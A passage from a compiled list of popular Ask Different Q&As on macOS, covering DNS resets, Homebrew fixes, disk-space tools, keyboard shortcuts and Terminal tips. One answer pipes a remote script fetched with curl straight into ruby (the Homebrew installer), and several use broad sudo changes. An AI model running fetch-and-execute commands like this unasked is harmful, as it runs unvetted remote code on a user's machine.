**问题描述 / Problem Description**:
Tags: macos, macbook-pro, snow-leopard, network, dns | Score: 139 | Views: 360572 | Answers: 28

**解决方案 / Solution**:
It turns out the solution was to bounce mDNSResponder:

sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist
sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist


This was obtained by a different coworker from this Server Fault question.

OS X 10.10.0 – 10.10.3, Yosemite

Apparently, mDNSResponder doesn't exist in Yosemite (OS X 10.10). You can restart descoveryd instead to fix these issues.

sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.discoveryd.plist
sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.discoveryd.plist


OS X 10.10.4+, Yosemite

In OSX 10.10.4 the mDNSResponder has been reintroduced. So use the first one will work again.

---

#### 125. Mail App keeps popping up in the background in Mac OS Mojave

**问题描述 / Problem Description**:
Tags: macbook-pro, mail.app, macos | Score: 138 | Views: 221356 | Answers: 11

**解决方案 / Solution**:
I have the same issue: 
The google calendar stuff is nonsense. The notification settings suggestion doesn't work.

I've narrowed it down to the following:

I normally hit the red cross button on the viewer window once I have finished looking at my mail, this closes open viewer windows but leaves the mail app active in the dock:

So if I have mail running, but no viewer windows open, then I get a viewer window randomly popping up to the foreground a few times an hour. 

If instead of hitting the red cross button, I minimise mail using the minus button, then I don't get any viewer windows randomly opening. In this scenario, the mail viewer window is minimised either on the right hand side of the dock or into the application icon itself, depending on your settings (System Preferences > Dock > "Minimize windows into application icon").

So I have changed my habits to work around this annoying bug...

---

#### 126. What&#39;s a good graphical SFTP utility for OS X?

**问题描述 / Problem Description**:
Tags: macos, snow-leopard, software-recommendation, ssh, ftp | Score: 137 | Views: 376006 | Answers: 15

**解决方案 / Solution**:
Cyberduck (Free) and partner Mountain Duck ($39 with volume and enterprise options)
A great free FTP client. This is my go-to application. Anytime I need FTP access, I use Cyberduck. It's not quite as lightweight as Fugu, but it adds a lot more functionality than Fugu. I also really like the Growl integration with Cyberduck.


Fugu (Free)
Awesome little FTP client. As I noted above, this is a lightweight FTP client. It is great for simple FTP transfers and browsing. I do like the dual panel navigation.

Filezilla (Free)
I haven't actually used Filezilla extensively, but from what I've seen of it, I really like it. I downloaded it and played with it for a bit and I really like the tabbed connections. I also like the ability to jump to a path easily.

RBrowser (Free, $29 Upgrade)
A free FTP/FTP-SSL client. I don't usually use RBrowser because a $29 upgrade is necessary to unlock other protocols (Local, FTP/SSL/TLS, SFTP-SSH). I do like the Site Manager. It's a handy little thing to have.


I searched and came up with some other free FTP clients:
FireFTP (Free) - Firefox extension
The one downside I see is that this is for Firefox. The website doesn't make it clear how it works with Firefox, so I assume it is an extension.
Macfusion (Free)
This one relies on Google's MacFUSE. Since I don't know anything about MacFUSE, I don't know if this is good or bad.
Transmit ($34) By Panic
I have never used Transmit before, but I have used Coda and I definitely would recommend anything from Panic. The only reason I haven't used this because of the $34 price tag.

ForkLift2 ($30)
Never used it, just found it when searching.
Fetch ($24 per user)
An amazing program with a long, long, long mac heritage. It's way up there with Transmit by Panic and Interarchy as a file transfer program loved by long time Mac power users.
Flow ($30)
Never used it, but looks good from the screenshots. I really like the fact that it looks like Finder. I may have to give this one a try.

OneButton FTP (Free)
Just searching around and found yet another one...It looks pretty nice, except it's no longer supported. However, you can still download it.

---

#### 127. How to fix homebrew error: &quot;invalid active developer path&quot; after upgrade to OS X El Capitan?

**问题描述 / Problem Description**:
Tags: homebrew, macos | Score: 136 | Views: 125239 | Answers: 5

**解决方案 / Solution**:
Run the following commands to fix the above error

sudo xcode-select --install
sudo xcode-select -switch /


I found the answer on https://github.com/Homebrew/homebrew/issues/23500

I also had to do this:

sudo chown -R $(whoami):admin /usr/local


Because of some permission issues. However, do this only if you have to.

---

#### 128. Why does my brew installation not work?

**问题描述 / Problem Description**:
Tags: macos, command-line, homebrew, path | Score: 134 | Views: 736571 | Answers: 13

**解决方案 / Solution**:
I had the same problem—installed brew, used it, but now it doens't work, ie, brew command not recognized anymore.
The context of my brew-not-recognized-anymore problem is a bit more specific: I'm using iTerm instead of Terminal, I installed brew in the standard way to the standard place, I used brew to install zsh and oh-my-zsh, and at that point the brew command stopped working.
I wasn't able to find the solution to my subset of the brew-not-recognized-anymore problem anywhere, so I'm posting the solution in case anyone else has this sort of brew-not-recognized-anymore problem.
Adding this to my .zshrc solved the problem on a machine with Apple M1 CPU:
eval $(/opt/homebrew/bin/brew shellenv)

Note that this is not the same as adding to the PATH variable. The brew command is indeed located in those standard locations listed in other solutions. It turned out not to be a PATH variable thing that was causing this subset of the brew-not-recognized-anymore problem.

---

#### 129. Unable to modify the volume with the keyboard

**问题描述 / Problem Description**:
Tags: keyboard, macos, macbook-pro, audio | Score: 134 | Views: 534934 | Answers: 11

**解决方案 / Solution**:
What worked for me: open up a Terminal window and run:

sudo killall coreaudiod


You may also need to run the following two commands right after:

sudo kextunload /System/Library/Extensions/AppleHDA.kext 
sudo kextload /System/Library/Extensions/AppleHDA.kext

---

#### 130. How can I figure out what&#39;s slowly eating my drive space?

**问题描述 / Problem Description**:
Tags: macos, disk-space, filevault | Score: 133 | Views: 114263 | Answers: 19

**解决方案 / Solution**:
I've had a very similar issue, and so I decided to compile several methods for solving it. So, following, there are those options and some of them I got from the answers already provided here. I understand this is a little bit offtopic from the question, but it's in tune with the answers. This has many parts and those are all softwares I could try myself somehow.
It's generally a good idea to pay close attention for using the sudo options below so the software can have access to every file, which will likely include some big hidden ones.

Here's a brief list of apps for checking the disk usage:

GrandPerspective is only graphical, using the Treemap, it can measure files by logical or physical methods before scanning, show/hide package contents and change color scheme on the fly. It also is able to save the scanned data for archiving or comparing multiple windows.

Disk Inventory X also uses the Treemap graphical scheme but along side a list view of folders and files. The grahpics isn't as good as GrandPerspective neither the list as good as OmniDiskSweeper, but it does a good job mixing both. It has a Finder plugin and the most options between the 3 on preferences. It's the most complex, but not all complete.

OmniDiskSweeper is non-graphical and very similar to Finder's column view. You choose the folder or disk to analyse, it will order them by disk usage after taking its time to calculate. You can then just delete (move to trash) anything listed.


So each one has its advantages and highlights, I'm still not sure if there's one that comes on top. They're all free.

There is also a different approach, of apps for scanning specific expected places and files for space usage in non-optimal ways. They basically gather some known things about the system that can be bloating your disk all in one nice interface so you can see and decide what to delete.

CleanMyMac lists caches, logs, language files, universal binaries, development &quot;junk&quot;, extensions and applications. It scans through the files and also uses some knowledge base it has. Great interface, simple to use. CleanMyMac has a free trial which will only clean up to 500 MB.

XSlimmer is very specific. It remove &quot;unnecessary&quot; code from &quot;fat&quot; binaries and Strip out unneeded languages, as it says on the website. Universal Binaries, that is, use a lot of space for storing files to run in several different architectures and languages. So, this strips all of them to shrink to only your computer needs. XSlimmer is currently discontinued.



Another approach is looking for duplicate files. There are many commercial options, some may be better than the listed below, I haven't tried them all. Anyway, I'm listing my choice of apps considering which ones I was able to try.

TidyUp is a very well known app in this subject. You can specify where to scan for what kind of duplicates. It offers basic and advanced modes, several different strategies and criterias.

MrClean is a free tool that just scans for folders for duplicates and trash them. Very simplistic but efficient if you're sure on what you're doing.

Chipmunk scans duplicates and let you choose which ones you want to trash. It offers a node-view of folders and you can select to &quot;delete all files in a folder that have duplicates elsewhere, or vice versa&quot; as well as hand-picking. It may take very long to scan all files, but it does a very decent job after that.

DupeCheck &quot;drop a file on it and it will use your Spotlight index to see if you have a potential duplicate somewhere.&quot; That's about this nice open source app. Not a great tool for space cleaning at once, but over time it helps you keep your space clean.

DuplicateFileSearcher from the website: &quot;is a free powerful software utility that will help you to find and delete duplicate files on your computer. It can also be used to calculate MD5 and SHA hashes. The software runs in Windows, Linux, Solaris and MacOS.&quot;. Enough said.



Next I'll briefly discuss on a similar approach by quoting relevant parts about two other things that can be done to look for missing disk space, without installing anything new, just using the command line (the Terminal).
This (long but good) one is from MacFixIt forums (go there for more options and details):

In most cases, there really are files occupying part of the volume, but the files are invisible in normal use of the Finder.
Using the Finder’s Go to Folder feature (in the Go menu), look at the sizes of the contents of these folders, by pasting in these pathnames:
/private/var/vm 
/private/var/log 
/Volumes 

The /private/var/vm directory contains the swapfiles used by virtual memory. New ones are made as more data is swapped from RAM to the hard drive. The entire process of creating them begins at each reboot or restart; do not attempt to remove them yourself. Check the total size of all the swapfiles, right after you boot, and as the disk fills up. In Panther, the first two swapfiles are 64 MB, then each new one is twice the size of the preceeding one (128 MB, 256 MB, 512 MB, 1 GB) up to a maximum size of 1 GB. In Tiger, the first two swapfiles are 64 MB, the next one is 128 MB, and any additional swapfiles are 256 MB.
If you do not run the daily, weekly, and monthly maintenance scripts (either by using a utility, or by running the commands sudo periodic daily, sudo periodic weekly, and sudo periodic monthly in Terminal), the logs on the startup volume can become too large. If an error is occurring frequently and is being logged, you can have a very large file at /private/var/log/system.log.
The files in /Volumes should be aliases to your mounted volumes. Do not remove these aliases, because anything you do to them happens to the contents of the corresponding volumes. If you are not confident that you can explore this folder without mishap, before you begin, properly unmount any volume other than the startup volume, if the missing disk space problem affects only that volume. External FireWire drives can be disconnected after proper unmounting.
Sometimes, backup programs that cannot find an intended destination (or target) volume for a backup create a folder with the same name as the destination, and put the folder into the /Volumes directory. There are cases in which the entire startup volume has been backed up on itself, in a folder inside /Volumes. If the amount of missing space is about the size of your user folder, such a backup is likely to be the explanation. If you use Carbon Copy Cloner or another backup or cloning utility and have its preferences configured to create a backup on a schedule, and the intended destination volume is not mounted or is sleeping at the scheduled time, the backup is created in the /Volumes directory.
To check the size of the normally invisible /Volumes directory on the active startup volume, open a new Finder window. Select the startup volume in the list at the left, then choose column view (the one at the right of the three views). From the Finder’s Go menu, choose Go to Folder, and paste in:
/Volumes 

The /Volumes directory becomes visible in the Finder; find its size by selecting it and typing Command I. My /Volumes directory is reported to be 12K.

This other one is from Mac OS X Hints forums (not much more to see there):

You may want to run a du in terminal to see what is all going on. This could take a few minutes to run.
An example would be to open up terminal.app then run these commands:
sudo du -h -d 1 -c /

Input your password when it prompts for it then let it go, it will take a few minutes to run so be paitent.

du stands for Disk Usage. There's also df. I like including the -x to the above command, and sort;
sudo du -cxhd 1 / | sort -h


Adding to the command line option, you could use an automator service for opening any app. With this you will get different (and more complete) results on GUI.
Or, if you're on a Power PC, using Rosetta or anything before Snow Leopard, you can mix any of the before mentioned apps with Pseudo. It's a little app to open things as admin. Picture it like a GUI for sudo.


Finally, there's a complete newbie guide on &quot;The X Lab&quot; that I just won't quote here for it's too long.

---

#### 131. Silencing &quot;Your disk is almost full&quot; notification

**问题描述 / Problem Description**:
Tags: notifications, disk-space, macos | Score: 133 | Views: 121895 | Answers: 4

**解决方案 / Solution**:
The solution to disabling the "almost full" and "full" notification is to disable the daemon responsible for it:

launchctl unload -w /System/Library/LaunchAgents/com.apple.diskspaced.plist


or

launchctl stop com.apple.diskspaced


Alternatively, if you only want to prevent the "almost full" from appearing so often then you can lower the GB threshold via:

minFreeSpace (int) - minimal free size in GB. Default: 20


The default 20GB is too high for small SSDs and a possible bug causes the alert to be shown every day rather than just once, so as a workaround you can lower the free space before the alert appears, e.g. to 10GB:

defaults write com.apple.diskspaced minFreeSpace 10


The daemon only reads its prefs on startup so you need to restart it if you have system integrity turned off:

launchctl unload -w /System/Library/LaunchAgents/com.apple.diskspaced.plist
launchctl load -w /System/Library/LaunchAgents/com.apple.diskspaced.plist


Otherwise kill it:

killall diskspaced


In case you are interested in the other preferences for these disk alerts you can view some of them using the help param:

/System/Library/PrivateFrameworks/StorageManagement.framework/Versions/A/Resources/diskspaced help
---
  Domain: com.apple.diskspaced
  Supported keys:
  debugLog (BOOL) - log additional debug information. Default: NO
  checkAllVolumes (BOOL) - check all volumes. Default: NO
  minDiskSize (int) - minimal disk size in GB. Default: 128
  minFreeSpace (int) - minimal free size in GB. Default: 20
  minPurgeableSpace (int) - minimal purgeabe space size in GB. Default: 20
---
  Commands: removeAllNotifications - Removes all scheduled and delivered user notificiations.


And here are a couple of hidden ones:

warningInterval (integer default 0)
lastWarningDate (string e.g. 2017-05-05 16:48:29 +0000)


I didn't look too closely at but it is possible setting the last warning date to a date in the future would also prevent the alert displaying.

---

#### 132. Can I delete unnecessary device simulators of Xcode?

**问题描述 / Problem Description**:
Tags: ios, xcode, macos | Score: 132 | Views: 174153 | Answers: 11

**解决方案 / Solution**:
Yes, you can delete any simulator that you don't use.  I do this routinely when I stop supporting older iOS versions.
If you delete them and then you find that you need them at some point in the future, you can redownload them from Apple's developer site.
The best way to delete them is in Xcode.  Go to Window -&gt; Devices and Simulators.  This will open a new window with all the devices you use in Xcode.
At the top, tap on Simulators and you'll see a list on the left-side.
From there, find the simulator you want to delete and Cntl - click (or right-click) and select Delete.
I do this with each simulator that runs in each iOS version that I no longer support.
Update July 2020: There's a free utility in the Mac App Store named DevCleaner for Xcode.  This application can display and delete simulators and various caches.  I've found it be a very quick and easy way to regain space.  I'm not the developer or associated with this application in any way.

---

#### 133. How do I negotiate dialogue boxes using the keyboard only?

**问题描述 / Problem Description**:
Tags: macos, keyboard | Score: 132 | Views: 45814 | Answers: 5

**解决方案 / Solution**:
macOS provides functionality to cycle through dialog boxes, but there is a system setting that must be enabled.
Toggle Functionality with Keyboard Shortcut
Press Control-F7
System Settings (macOS Ventura and later)
Starting with macOS Ventura, the setting is in System Settings → Keyboard → Keyboard Navigation. Click the toggle to enable the setting.

System Preferences (macOS Monterey and earlier)
In macOS Monterey and earlier versions, the setting is in System Preferences → Keyboard → Shortcuts → Full Keyboard Access... → All Controls


Keyboard Control Tips

Now you can navigate dialogue boxes using the keyboard:

Press Tab to move the focus the next button on the dialog.
Press Shift-Tab to move back to the previous button.
Press Space to trigger the currently selected button (highlighted border).

Regardless of which control is currently selected:

Pressing Return will always trigger the default button (highlight-coloured button).
Pressing Esc will always cancel the dialog.

---

#### 134. How can I unpack .7z files via MacOS terminal?

**问题描述 / Problem Description**:
Tags: macos, command-line, zip, compression | Score: 132 | Views: 253014 | Answers: 10

**解决方案 / Solution**:
You can install p7zip with Homebrew. So

% brew install p7zip
% 7za x myfiles.7z


Installing Homebrew as @EraserPencil suggested makes sense as the OP might need more programs in the future, which would be at his fingertips then. You can install Homebrew with

/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"


It should be noted there is 7z e as well but as commented by @Qback, this does almost never do what you want if you have subdirectories in the archive.

---

#### 135. Is there a way to completely disable Dock?

**问题描述 / Problem Description**:
Tags: macos, dock, launchbar | Score: 132 | Views: 79025 | Answers: 6

**解决方案 / Solution**:
This article from Lifehacker.com.au suggests setting the Dock autohide delay to 1000 seconds, like so:

defaults write com.apple.dock autohide-delay -float 1000; killall Dock


To restore the default behavior:

defaults delete com.apple.dock autohide-delay; killall Dock


The author says he sets the delay to two seconds, so he can still get to the Dock in those rare cases when it's needed.

---

#### 136. Getting all files from a web page using curl

**问题描述 / Problem Description**:
Tags: macos, bash | Score: 131 | Views: 361070 | Answers: 5

**解决方案 / Solution**:
Use wget instead.
Install it with Homebrew: brew install wget or  MacPorts: sudo port install wget
For downloading files from a directory listing, use -r (recursive), -np (don't follow links to parent directories), and -k to make links in downloaded HTML or CSS point to local files (credit @xaccrocheur).
wget -r -np -k http://www.ime.usp.br/~coelho/mac0122-2013/ep2/esqueleto/

Other useful options:

-nd (no directories): download all files to the current directory
-e robots=off: ignore restrictions in robots.txt file and don't download robots.txt files
-A png,jpg: accept only files with the extensions png or jpg
-m (mirror): -r --timestamping --level inf --no-remove-listing
-nc, --no-clobber: Skip download if files exist

---

#### 137. How to turnoff screen / lock Macbook Pro with touch bar using keyboard?

**问题描述 / Problem Description**:
Tags: macbook-pro, touch-bar | Score: 131 | Views: 148357 | Answers: 10

**解决方案 / Solution**:
you can add the sleep function to the touch bar through system preferences > keyboard > customize control strip and then drag the sleep icon to the touch bar, allowing you to put it to sleep by pressing 1 button.

---

#### 138. Enter a filename in the File Open dialog

**问题描述 / Problem Description**:
Tags: macos | Score: 130 | Views: 44849 | Answers: 3

**解决方案 / Solution**:
Yes. When the Finder dialog box is active type ⇧⌘G to bring up the Go to the folder direct entry dialog. You can enter the path to the file in the dialog using the Unix-type path expressions you'd expect: ~ for your home directory, / for a directory separator, etc.

---

#### 139. How to get rid of firewall &quot;accept incoming connections&quot; dialog?

**问题描述 / Problem Description**:
Tags: macos, snow-leopard, firewall | Score: 130 | Views: 127359 | Answers: 14

**解决方案 / Solution**:
sudo codesign --force --deep --sign - /path/to/application.app


I've never had to create a certificate using this method.

If that doesn't help, try without --deep and without the trailing slash:

sudo codesign --force --sign - /path/to/application.app




Note, just to make it clearer: After having applied the signature, start the app, accept incoming connections one last time, then quit and start again to verify that the request is gone.

---

#### 140. How do I type the euro value sign € on a Mac?

**问题描述 / Problem Description**:
Tags: macos, keyboard | Score: 129 | Views: 710506 | Answers: 17

**解决方案 / Solution**:
On an American English keyboard you can type the European Currency symbol (€) with Option + Shift + 2.
NOTE: It is also worth to note that specifically in Terminal, option 'Use Option as Meta Key' is turned on by default and this blocks this key combination. Please go to Terminal 'preferences', section 'Profiles' and under tab 'Keyboard' untick 'Use Option as Meta Key' checkbox to have it working.

---

#### 141. How can I achieve page-up and page-down in OS X?

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, mac | Score: 129 | Views: 98391 | Answers: 9

**解决方案 / Solution**:
If you have a full keyboard you can use the pgup and pgdown keys on your keyboard, near the numpad. 

If you are not using a full keyboard, function, labeled fn on your keyboard, plus the up and down arrow keys will give you a page up and down.

For certain applications, particularly in shell / terminal / tty windows, the expected behaviour is achieved with fn+shift+arrow up/down

---

#### 142. Which application to preview .md files?

**问题描述 / Problem Description**:
Tags: macos | Score: 129 | Views: 187059 | Answers: 12

**解决方案 / Solution**:
The superuser question, Markdown Live Preview Editor?, provides a wealth of options:

BBEdit
TextMate
Mou
Marked
MarkdownLive
Atom
Marked 2
MacDown

In additional to those, you can install a markdown QuickLook plugin for Finder based previews.
MarkdownLive

Mou

Marked 2

---

#### 143. macOS windows requiring an explicit click to make active, before UI elements inside can be clicked

**问题描述 / Problem Description**:
Tags: macos | Score: 128 | Views: 55146 | Answers: 4

**解决方案 / Solution**:
The answer, in general, is "no". There are some exceptions/workarounds though, for example: 


You can click through to any control in an unfocused window using Cmd-Click. This will directly operate that control without focusing the window, which might save you a click in your side-by-side browser window scenario. Unfortunately it's up to each application developer to make this work sensibly, and some unfocused applications will still perform any special action assigned to Cmd-Click, rather than treating it as a simple click.
In Terminal.app, Cmd-Right Click will paste the contents of the primary selection (the last text you highlighted in any terminal window) into the same or another terminal, whether that terminal is focused or not.
Specifically for X11 applications running under XQuartz.app (which isn't very many these days), you can specify the "focus follow mouse" option so that X11 windows are focused as you mouse over them. (There also used be a hidden focus-follows-mouse option for Terminal.app windows, don't know if it still works in El Capitan or Sierra.)

---

#### 144. Set the hostname/computer name for macOS

**问题描述 / Problem Description**:
Tags: macos, network | Score: 126 | Views: 234369 | Answers: 6

**解决方案 / Solution**:
Setting the Mac hostname or computer name from the terminal


  
  Open a terminal. 
  Type the following command to change the primary hostname of your Mac:
  This is your fully qualified hostname, for example myMac.domain.com 

sudo scutil --set HostName &lt;new host name&gt;

  Type the following command to change the Bonjour hostname of your Mac:
  This is the name usable on the local network, for example myMac.local. 

sudo scutil --set LocalHostName &lt;new host name&gt;

  If you also want to change the computer name, type the following command:
  This is the user-friendly computer name you see in Finder, for example myMac. 

sudo scutil --set ComputerName &lt;new name&gt;

  Flush the DNS cache by typing: 

dscacheutil -flushcache

  Restart your Mac.

---

#### 145. Copying the current directory&#39;s path to the clipboard

**问题描述 / Problem Description**:
Tags: macos, finder | Score: 126 | Views: 100324 | Answers: 19

**解决方案 / Solution**:
Option+Command+C
Will copy the path for selected folder or file to the clipboard. Tried on El Capitan through Sonoma.

---

#### 146. Can anyone recommend an app for creating flowcharts and diagrams?

**问题描述 / Problem Description**:
Tags: macos, software-recommendation, ui, drawing | Score: 126 | Views: 291595 | Answers: 31

**解决方案 / Solution**:
For free online diagramming there's diagrams.net, which I am a developer on. It supports the automatic connection and dragging of components you're looking for. Also, it's free, which meets your under $30 requirement.
There is also a Desktop version available.

---

#### 147. Ctrl + Alt + Delete: Mac Equivalent?

**问题描述 / Problem Description**:
Tags: macos, keyboard | Score: 126 | Views: 1594813 | Answers: 11

**解决方案 / Solution**:
The keyboard shortcut you’re looking for is ⌘ + ⌥ + ⎋, alternatively known as command + option + escape. This will bring up the Force Quit Applications window (see screenshot below).

---

#### 148. How to cd to a directory with a name containing spaces in bash?

**问题描述 / Problem Description**:
Tags: macos, command-line | Score: 125 | Views: 799124 | Answers: 6

**解决方案 / Solution**:
You can use the Tab key after pressing the first few characters (this will then "fill in" the rest of the folder for you e.g. type cd ~/LTab fills in cd ~/Library/ then type ApTab and it will fill in the rest for you.

If there is a space between words and you don't want to use the methods above, put a \ (backslash) before the space, e.g. cd ~/Library/Application\ Support.

---

#### 149. The operation can’t be completed because the original item for “Foo” can’t be found

**问题描述 / Problem Description**:
Tags: macos, network, nas, afp | Score: 124 | Views: 255645 | Answers: 30

**解决方案 / Solution**:
Apparently this problem can occur for many different reasons.  In my case it was solved by re-launching the finder.  A description and solution for this was at http://www.cnet.com/news/fix-shared-computer-not-found-in-finder/ .


  To fix this problem, you simply need to relaunch the Finder, and it will re-populate the list of shared devices. To do this, you can do one of the following:
  
  
  Hold the Option key and right-click the Finder icon in the Dock, then select Relaunch.
  Press Option-Command-Escape or choose Force Quit from the Apple menu, then select the Finder and click Relaunch.
  Log out and log back in to your user account.

---

#### 150. How do I speed up new Terminal tab loading time?

**问题描述 / Problem Description**:
Tags: macos, terminal, command-line | Score: 124 | Views: 68299 | Answers: 11

**解决方案 / Solution**:
Short Answer:

The problem is caused by a (potentially) expensive ASL system log lookup.  To see this in action, run sudo fs_usage | grep 'asl.*login' in a Terminal window, then open a new Terminal window.

To solve the problem, configure Terminal to launch a non-standard shell:


Create a symlink to your preferred shell.  E.g.: sudo ln -s /bin/bash /usr/local/bin/bash
Open Terminal Preferences and select the "General" tab.
Select "Shells open with: Command" and enter the symlink you created in step 1.  E.g. "/usr/local/bin/bash".


Note 1: You may also need to add bash and -bash to the process list at "Terminal Preferences > Profiles > Shell > Ask before closing".

Note 2: /usr/local/bin is writable in OS X 10.11 (El Capitan) Rootless mode.  

To verify the fix:


Open a new Terminal window.
"Last Login:" should not be displayed at the top
Open the inspector (Command + I) and select the Info tab.
The command should read login -pfq username /usr/bin/bash or login -pfql username ...


Important: If the login command does not include the -q parameter, then you have not fixed the problem.

You can also use sudo fs_usage | grep 'asl.*login' to verify that /var/log/asl is not accessed when opening a new Terminal window.

Details:

There are a number of bugs at play here.

The actual cause of the slowness is /usr/bin/login, which by default will display the date of your last login.  To get this last login date, it searches the ASL (Apple System Log) database at /var/log/asl/.  These log files can be very heavily fragmented and it's this file fragmentation that causes the delay when opening a new window or tab.  (Bug 1)

The only way to suppress the ASL search for last login is to pass the -q parameter to /usr/bin/login.  The .hushlogin file will also suppress the "Last Login" display, but it does not suppress the expensive ASL search. (Bug 2)

Terminal always uses /usr/bin/login to launch each new window/shell.  There is no option to launch a shell directly nor is there a way to directly control the parameters passed to /usr/bin/login (Bug 3).

As it turns out, Terminal will pass the -q parameter to /usr/bin/login when it is configured to use a non-standard shell.  (Bug 4)

The -q parameter is what we need to avoid the problem, hence the symlink to /usr/local/bin/bash.

---

#### 151. How to convert a HEIF/HEIC image to JPEG in macOS?

**问题描述 / Problem Description**:
Tags: macos, icloud, photos.app, file-conversion, image-editing | Score: 123 | Views: 101958 | Answers: 8

**解决方案 / Solution**:
You can use the command line tool imagemagick to convert HEIC images to JPG.
# install imagemagick
brew install imagemagick

# convert a single image
magick convert foo.HEIC foo.jpg

# bulk convert multiple images
magick mogrify -monitor -format jpg *.HEIC

Update: Now MacOS provides a built-in converter using Finder, if you want a GUI solution.

NOTE: As of version 7, magick convert results in this warning:
WARNING: The convert command is deprecated in IMv7, use &quot;magick&quot; instead

so, for version 7 of imagemagick (and possibly thereafter), the second command can be simplified to just:
# convert a single image
magick foo.HEIC foo.jpg

---

#### 152. How do I get detailed SMART disk information on OS X (Mavericks or later)

**问题描述 / Problem Description**:
Tags: hard-drive, macos, diskutil | Score: 123 | Views: 224005 | Answers: 8

**解决方案 / Solution**:
I recently had the same question and found a command line tool www.smartmontools.org which can be installed via brew:
brew install smartmontools

Also via MacPorts:
sudo port install smartmontools

you can then run it
smartctl -a disk0s3

for the full report where disk0s3 is the disks physical backing which can be found in Disk Utility.app by getting info on the drive. (or via diskutil list on command line.) Here is an example of the output:
smartctl 6.2 2013-07-26 r3841 [x86_64-apple-darwin13.1.0] (local build)
Copyright (C) 2002-13, Bruce Allen, Christian Franke, www.smartmontools.org

=== START OF INFORMATION SECTION ===
Model Family:     Samsung based SSDs
Device Model:     Samsung SSD 840 Series
Serial Number:    S14LNEAD609248A
LU WWN Device Id: 5 002538 5503acd2e
Firmware Version: DXT08B0Q
User Capacity:    500,107,862,016 bytes [500 GB]
Sector Size:      512 bytes logical/physical
Rotation Rate:    Solid State Device
Device is:        In smartctl database [for details use: -P show]
ATA Version is:   ACS-2, ATA8-ACS T13/1699-D revision 4c
SATA Version is:  SATA 3.1, 6.0 Gb/s (current: 6.0 Gb/s)
Local Time is:    Thu Jun 19 16:34:10 2014 MDT
SMART support is: Available - device has SMART capability.
SMART support is: Enabled

=== START OF READ SMART DATA SECTION ===
SMART overall-health self-assessment test result: PASSED

General SMART Values:
Offline data collection status:  (0x00) Offline data collection activity
                    was never started.
                    Auto Offline Data Collection: Disabled.
Self-test execution status:      (   0) The previous self-test routine completed
                    without error or no self-test has ever 
                    been run.
Total time to complete Offline 
data collection:        (53956) seconds.
Offline data collection
capabilities:            (0x53) SMART execute Offline immediate.
                    Auto Offline data collection on/off support.
                    Suspend Offline collection upon new
                    command.
                    No Offline surface scan supported.
                    Self-test supported.
                    No Conveyance Self-test supported.
                    Selective Self-test supported.
SMART capabilities:            (0x0003) Saves SMART data before entering
                    power-saving mode.
                    Supports SMART auto save timer.
Error logging capability:        (0x01) Error logging supported.
                    General Purpose Logging supported.
Short self-test routine 
recommended polling time:    (   2) minutes.
Extended self-test routine
recommended polling time:    (  70) minutes.
SCT capabilities:          (0x003d) SCT Status supported.
                    SCT Error Recovery Control supported.
                    SCT Feature Control supported.
                    SCT Data Table supported.

SMART Attributes Data Structure revision number: 1
Vendor Specific SMART Attributes with Thresholds:
ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE
  5 Reallocated_Sector_Ct   0x0033   100   100   010    Pre-fail  Always       -       0
  9 Power_On_Hours          0x0032   099   099   000    Old_age   Always       -       2379
 12 Power_Cycle_Count       0x0032   098   098   000    Old_age   Always       -       1579
177 Wear_Leveling_Count     0x0013   096   096   000    Pre-fail  Always       -       38
179 Used_Rsvd_Blk_Cnt_Tot   0x0013   100   100   010    Pre-fail  Always       -       0
181 Program_Fail_Cnt_Total  0x0032   100   100   010    Old_age   Always       -       0
182 Erase_Fail_Count_Total  0x0032   100   100   010    Old_age   Always       -       0
183 Runtime_Bad_Block       0x0013   100   100   010    Pre-fail  Always       -       0
187 Uncorrectable_Error_Cnt 0x0032   100   100   000    Old_age   Always       -       0
190 Airflow_Temperature_Cel 0x0032   059   039   000    Old_age   Always       -       41
195 ECC_Error_Rate          0x001a   200   200   000    Old_age   Always       -       0
199 CRC_Error_Count         0x003e   100   100   000    Old_age   Always       -       0
235 POR_Recovery_Count      0x0012   099   099   000    Old_age   Always       -       1571
241 Total_LBAs_Written      0x0032   099   099   000    Old_age   Always       -       14090964124

SMART Error Log Version: 1
No Errors Logged

SMART Self-test log structure revision number 1
No self-tests have been logged.  [To run self-tests, use: smartctl -t]


SMART Selective self-test log data structure revision number 1
 SPAN  MIN_LBA  MAX_LBA  CURRENT_TEST_STATUS
    1        0        0  Not_testing
    2        0        0  Not_testing
    3        0        0  Not_testing
    4        0        0  Not_testing
    5        0        0  Not_testing
  255        0    65535  Read_scanning was never started
Selective self-test flags (0x0):
  After scanning selected spans, do NOT read-scan remainder of disk.
If Selective self-test is pending on power-up, resume after 0 minute delay.

---

#### 153. What functionality do &#39;marks&#39; offer in the El Capitan Terminal?

**问题描述 / Problem Description**:
Tags: terminal, macos | Score: 123 | Views: 21018 | Answers: 2

**解决方案 / Solution**:
Marks in the Terminal

The new Terminal marks (available starting with OS X 10.11 - El Capitan) are similar to Bookmarks, which are also available in the Terminal, allowing you to mark window positions and then giving you the option of going back at a later point.

Marks (or Bookmarks) don't refer to your command history, but to the scroll buffer used in the Terminal window/tab.

Marking a Line

By default, every time you press Enter in the Terminal window, the line is marked, which is displayed using an opening bracket at the beginning of the line and a closing one at the very end. This default behavior can be turned off using the Edit > Marks > Automatically Mark Prompt Lines menu entry. When this is disabled, you can still manually execute and mark a command using Cmd+Enter (or with the Edit > Marks > Mark as Prompt and Send Return menu entry).

If you have automatic marking enabled and want to run a command without marking it as a prompt, you can do this using Cmd+Shift+Enter (or with the Edit > Marks > Send Return Without Marking menu entry).

Disabling Marks

Automatic marking of lines can be disabled using the Edit > Marks > Automatically Mark Prompt Lines menu entry.

From the command line, the same can be achieved using

defaults write com.apple.Terminal AutoMarkPromptLines -bool NO


Hiding Marks

If you want to use the mark functionality, but don't want to see the brackets at the beginning and end of the line, you hide them using the View > Hide Marks menu entry. This will keep the below functionality intact, but will no longer show the brackets.

Jumping between Marks

Once a line has been marked, you can quickly jump to the previous mark using Cmd+Up or to the next one using Cmd+Down. Similar options are provided for Bookmarks, and for selecting to the next/previous mark:



Manually Marking a Line

